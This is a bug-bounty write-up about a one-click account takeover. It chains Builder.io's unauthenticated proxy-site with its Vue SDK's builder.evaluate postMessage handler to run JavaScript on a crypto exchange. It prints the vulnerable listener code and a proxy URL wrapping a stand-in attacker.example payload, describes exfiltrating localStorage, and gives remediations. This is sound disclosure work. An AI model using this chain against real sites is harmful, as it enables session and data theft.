---
title: "Account Takeover via Builder.io SDK XSS"
date: 2026-10-25T00:00:00Z
draft: false
description: "A Builder.io Vue SDK postMessage bridge plus an open proxy-site chain let one click run arbitrary JavaScript on a private crypto exchange origin."
summary: "Builder.io's unauthenticated proxy-site plus its Vue SDK's builder.evaluate postMessage handler chained into same-origin XSS on a private crypto exchange — one click, logged-in victim."
tags: ["Account Takeover", "XSS", "postMessage", "CSP", "CWE-79"]
severity: ["Medium"]
program: "Private target"
bounty: "Duplicate"
---

## Summary

A private crypto exchange embeds the Builder.io Vue SDK (v5.2.14) on production marketing pages. When those pages are iframed with `?builder.frameEditing=true`, the SDK registers a `builder.evaluate` `postMessage` handler that executes arbitrary JavaScript via `Function(text)`. The handler trusts messages from `builder.io` by default.

Separately, Builder.io ships a public, unauthenticated server-side proxy at `/api/v1/proxy-site?proxyUrl=<url>` that fetches arbitrary HTML and serves it from the `builder.io` origin with a CSP that only sets `frame-ancestors` — no `script-src`, so inline scripts execute freely.

Chaining the two: an attacker hosts a malicious HTML page, wraps it in the proxy URL, and sends the link to a logged-in victim. One click → the attacker's code runs in the exchange's origin, reading `localStorage` / `sessionStorage` and making same-origin (and credentialed CORS) requests with the victim's session cookies.

Although the root cause lives in Builder.io's SDK and proxy, the impact is JavaScript execution on the exchange, and the remediations that matter are within the program's control.

## Attack Flow

{{< attack-flow attacker="ATTACKER (one link)" victim="VICTIM (logged into private target)" >}}
@attacker 1. Host malicious HTML
poc.html anywhere public

@handoff 2. Wrap in Builder.io proxy
https://builder.io/api/v1/proxy-site?proxyUrl=…

@victim 3. Victim opens the link (logged in)
hidden iframe → /m/earn?builder.frameEditing=true
SDK enters editing mode, posts builder.sdkInfo

@attacker 4. postMessage builder.evaluate from builder.io
trustedHosts check passes → Function(text) runs on target.example

@attacker 5. Exfiltrate from same origin
localStorage, sessionStorage, credentialed CORS to internal APIs

@takeover ACCOUNT TAKEOVER / RECON
{{< /attack-flow >}}

## Root Cause

Two independent gaps that only become dangerous together.

### 1. Builder.io Vue SDK — `builder.evaluate` with a trusted-hosts list

Loaded on `https://www.target.example/m/earn`, the SDK registers a message listener when the page is iframed with `builder.frameEditing=true`:

```js
window.addEventListener('message', t => {
  if (!xt(e.trustedHosts, t)) return;
  let {data: i} = t;
  if (i?.type) switch(i.type) {
    case 'builder.evaluate': {
      let e = i.data.text, t = i.data.arguments || [], a = i.data.id;
      let o = Function(e);   // ← arbitrary code execution
      let s = o.apply(null, t);
      // result posted back to window.parent
    }
  }
});
```

The origin check `xt()` validates against a default trusted list that includes `builder.io`, `*.beta.builder.io`, `localhost`, and `qa.builder.io`. Any page served from `builder.io` — including the proxy-site — passes.

### 2. Builder.io `proxy-site` — open HTML proxy, weak CSP

`GET https://builder.io/api/v1/proxy-site?proxyUrl=<url>` is unauthenticated. It fetches the given URL and returns the HTML from the `builder.io` origin. The response CSP contains only `frame-ancestors` — no `script-src` / `default-src` — so inline scripts execute freely.

## Steps to Reproduce

**Prerequisites:** a logged-in account on the private target; a publicly hosted PoC HTML file (or the console shortcut below).

**Step 1 — Host the PoC** at any public URL, e.g. `https://attacker.example/poc.html`.

**Step 2 — Wrap it in the Builder.io proxy:**

```
https://builder.io/api/v1/proxy-site?proxyUrl=https://attacker.example/poc.html
```

**Step 3 — Victim is logged into `https://www.target.example` in the same browser.**

**Step 4 — Victim opens the attack URL.** The page (served from `builder.io`):

1. Creates a hidden iframe to `https://www.target.example/m/earn?builder.frameEditing=true`
2. Waits for the SDK's `builder.sdkInfo` handshake
3. Sends `builder.evaluate` messages from the `builder.io` origin → origin check passes
4. `Function(text)` runs arbitrary JavaScript on `www.target.example`

**Step 5 — Observe** `document.domain === "www.target.example"`, exfiltrated `localStorage["user-cache"]`, and same-origin fetches that carry the victim's cookies.

## Impact

One click against a logged-in victim runs arbitrary JavaScript on `www.target.example`.

From that context an attacker can:

- Read all `localStorage` / `sessionStorage` (profile, KYC status, 2FA / passkey / anti-phishing flags, trading prefs, analytics IDs)
- Learn the victim's exact security posture before a follow-on attack
- Tamper with client-side storage for later visits
- Make credentialed CORS requests to `internal.target.example` (e.g. CSRF token from `/v2/index`, feature flags from `/v2/settings`)


## Remediation

1. **Remove the Builder.io SDK from production pages.** The `builder.evaluate` handler executes arbitrary code by design. If content editing is needed, load the SDK only in authenticated admin/editor sessions — never on public-facing pages.
2. **Tighten `frame-ancestors`.** Do not allow `builder.io` (or any untrusted origin) to iframe production pages.
3. **Drop `'unsafe-eval'` from `script-src`.** Blocks `Function()` even if the SDK still loads.

## Timeline

| Date | Event |
|------|-------|
| 2026-10-25 | Reported to the program |
| 2026-10-26 | Closed as **Duplicate** of an earlier report covering JS execution through the Builder.io postMessage bridge; the proxy-based delivery was noted as additional reproduction detail |

## Bounty

Closed as duplicate — no bounty on this report. The proxy-delivery angle was still useful enough to write up.
